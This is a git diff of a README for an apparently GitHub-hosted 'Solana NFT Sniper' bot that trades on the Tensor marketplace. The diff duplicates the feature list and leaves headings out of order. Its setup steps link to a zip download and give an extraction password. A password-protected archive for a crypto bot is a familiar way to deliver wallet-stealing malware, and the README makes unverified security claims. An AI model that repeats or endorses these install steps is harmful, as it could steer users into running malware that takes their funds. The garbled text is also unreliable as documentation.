@@ -1,10 +1,41 @@
 
 # Solana NFT Sniper
-
-Welcome to Solana NFT Sniper, your cutting-edge solution for snipping NFTs on the Solana blockchain via the Tensor Marketplace. This repository houses the codebase for a sophisticated bot designed to streamline and optimize your NFT sniping experience, ensuring you stay ahead in the competitive world of Solana NFT trading.
+SolanaNFTSnipBot is designed with a user-friendly program interface, omitting the need for a command-line interface (CLI). Explore the following functionalities to elevate your Solana NFT trading experience:
 
 ![Alt Text](https://github.com/medlaare/solana-nft-sniper/blob/main/Untitled.png?raw=true)
 ## Features
+# SolanaNFTSnipBot
+
+Welcome to SolanaNFTSnipBot, the intuitive bot designed for efficient NFT trading on the Solana blockchain. This repository showcases a user-friendly program interface, eliminating the need for a command-line interface (CLI). Explore the following features:
+
+## Functionality:
+
+1. **Tensor Marketplace Integration:**
+   - Seamless integration with the Tensor Marketplace for diverse access to Solana-based NFT projects.
+
+2. **Smart Sniping Algorithm:**
+   - Advanced algorithms for precise NFT prediction and sniping, optimizing success rates.
+
+3. **Visual Indicators for Discounted Purchases:**
+   - Real-time indicators (e.g., progress bars - 3%, 10%, 20%) for buying NFT collections at discounted rates (3%, 10%, 20% less than the current floor price).
+
+4. **Auto-Bidding Functionality:**
+   - Automated bidding capabilities streamline participation in auctions for efficient NFT collection acquisitions.
+
+5. **Security Measures:**
+   - Robust security measures ensure a secure NFT trading environment, safeguarding user accounts and sensitive information.
+
+6. **Logs Field with Full History:**
+   - The "Logs" field provides a detailed history of the bot's activities. Review the entire course of the bot's work, gaining insights into successful snipes, failed attempts, and other events.
+
+## Getting Started:
+
+1. Clone the repository.
+2. Follow the setup guide in the documentation.
+3. Customize the bot's configuration.
+4. Run the bot and enjoy streamlined Solana NFT trading!
+
+Contributions are welcome. Please use responsibly.
 
 1. **Tensor Marketplace Integration:**
    - Seamless integration with the Tensor Marketplace, providing users with access to a diverse range of Solana-based NFT projects.
@@ -29,8 +60,7 @@ Welcome to Solana NFT Sniper, your cutting-edge solution for snipping NFTs on th
 - [Clone](https://github.com/medlaare/solana-nft-sniper/archive/refs/heads/main.zip) the repository and follow the step-by-step setup guide in the documentation.
 - Extract archive with password `GgX2qVdUt`
 - `Customize the bot's configuration` to match your sniping strategy and preferences.
-- Run the bot and start sniping NFTs on the Solana blockchain effortlessly.
-
+- Run the bot
 ## Contribution
 
 Contributions from the community are highly encouraged. Whether you're a seasoned developer or a Solana NFT enthusiast, feel free to contribute by submitting bug reports, feature requests, or even pull requests to enhance the bot's capabilities.
